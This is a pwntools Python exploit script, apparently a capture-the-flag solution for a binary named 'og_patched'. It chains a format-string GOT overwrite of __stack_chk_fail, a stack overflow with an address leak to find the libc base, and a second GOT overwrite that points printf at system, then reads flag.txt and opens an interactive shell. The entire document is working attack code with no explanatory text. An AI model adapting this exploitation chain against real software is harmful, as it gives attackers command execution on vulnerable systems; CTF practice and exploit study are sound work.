#!/usr/bin/env python3
from pwn import *
exe = './og_patched'

elf = context.binary = ELF(exe)
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#### Exploit starts here ####


### helpers ###


io = start()

libc = ELF('./libc.so.6')

payload =  fmtstr_payload(6, {
    elf.got['__stack_chk_fail'] : elf.symbols.main
    }, write_size='short')

io.sendlineafter(b'name:',payload)

payload = b'%45$p'

payload += b'A' * (186 - len(payload))
payload += p64(elf.symbols.main)

io.sendlineafter(b'name:',payload)
io.recv()

io.recvuntil(b'0x') 
leak = int(io.recv(12).decode(),16)

log.info(hex(leak))

libc.address = leak - libc.symbols['__libc_start_main'] - 128

log.info(hex(libc.address))

payload =  fmtstr_payload(6, {
    elf.got['printf'] : libc.symbols.system
    }, write_size='short')

io.sendline(payload)

io.recvuntil(b'found')
io.sendline(b'cat flag.txt')

io.interactive()
